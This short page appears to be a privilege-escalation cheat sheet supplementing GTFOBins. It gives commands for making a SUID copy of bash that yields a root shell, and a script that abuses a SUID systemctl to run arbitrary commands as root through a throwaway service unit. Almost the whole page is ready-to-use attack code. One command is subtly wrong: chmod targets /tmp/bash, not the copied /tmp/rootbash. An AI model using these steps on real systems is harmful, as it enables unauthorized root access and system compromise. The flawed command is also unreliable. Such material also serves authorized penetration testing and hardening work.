# GTFOBins - extras

Some scripts, utilities, notes... complementary to GTFOBins.

<hr class="sep-both">

## ⚡ Create a root bash

<div class="row row-cols-md-2 mt-3"><div>

* ➡️ Version 1: with root executing 2 commands

```bash
$ cp /bin/bash /tmp/rootbash
```

Run **as root** (SUID executable, sudo...) the commands

```bash
$ chown root /tmp/rootbash
$ chmod +s /tmp/bash
```

Run the bash with `-p` and enjoy.

```bash
$ /tmp/rootbash -p
```
</div><div>

...
</div></div>

<hr class="sep-both">

## ⚡ SUID `systemctl` script

Description: this script make it easier to run several commands using `systemctl`.

<div class="row row-cols-md-2 mt-4"><div>

Create a file `script.sh` with the contents below

```bash
TF=$(mktemp).service
echo "[Service]
Type=oneshot
ExecStart=/bin/sh -c '$@ > /tmp/output'
[Install]
WantedBy=multi-user.target" > $TF
systemctl -f link $TF
systemctl -f enable --now $TF
cat /tmp/output
```
</div><div>

Calls

```bash
$ chmod +x script.sh
$ ./script.sh id
$ ./script.sh ls -laR /root
```
</div></div>